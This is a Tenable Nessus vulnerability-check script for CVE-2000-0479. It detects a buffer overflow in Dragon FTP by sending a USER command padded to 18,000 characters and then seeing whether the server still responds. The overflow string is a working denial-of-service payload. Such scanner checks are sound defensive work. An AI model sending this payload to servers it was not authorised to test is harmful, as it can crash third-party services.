#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(10450);
 script_version ("$Revision: 1.18 $");
 script_cve_id("CVE-2000-0479");
 script_bugtraq_id(1352);
 script_xref(name:"OSVDB", value:"349");

 script_name(english:"Dragon FTP USER Command Remote Overflow");
 script_summary(english:"Attempts a USER buffer overflows");
 
 script_set_attribute(
   attribute:"synopsis",
   value:"The remote FTP server has a remote buffer overflow vulnerability."
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "It was possible to crash the remote FTP server by issuing a USER\n",
     "command followed by a very long argument (over 16,000 characters).\n",
     "This is likely due to a remote buffer overflow vulnerability.  A\n",
     "remote attacker could exploit this to crash the server, or possibly\n",
     "execute arbitrary code."
   )
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Upgrade to the latest version of your FTP server."
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C"
 );
 script_end_attributes();

 script_category(ACT_DENIAL);
 script_family(english:"FTP");
 
 script_copyright(english:"This script is Copyright (C) 2000-2009 Tenable Network Security, Inc.");

 script_dependencie("find_service1.nasl", "ftp_anonymous.nasl", "ftpserver_detect_type_nd_version.nasl");
 script_require_ports("Services/ftp", 21);

 exit(0);
}

include("global_settings.inc");
include("ftp_func.inc");

if (report_paranoia < 2) exit(0);

port = get_kb_item("Services/ftp");
if(!port)port = 21;

if(!get_port_state(port))exit(0);
if (get_kb_item('ftp/'+port+'/broken') || get_kb_item('ftp/'+port+'/backdoor'))
  exit(0);

soc = open_sock_tcp(port);
if(soc)
{
  r = ftp_recv_line(socket:soc);
  if(r)
  {
  req = string("USER ", crap(18000), "\r\n");
  send(socket:soc, data:req);
  r = ftp_recv_line(socket:soc);
  close(soc);
  sleep(1);

  for (i = 1; i <= 4; i ++)
  {
    soc2 = open_sock_tcp(port);
    if (soc2) break;
    sleep(i);
  }
  if(!soc2)security_hole(port);
  else {
  	r2 = ftp_recv_line(socket:soc2, retry: 2);
  	close(soc2);
	if(!r2)security_hole(port);
      }
  }  
}
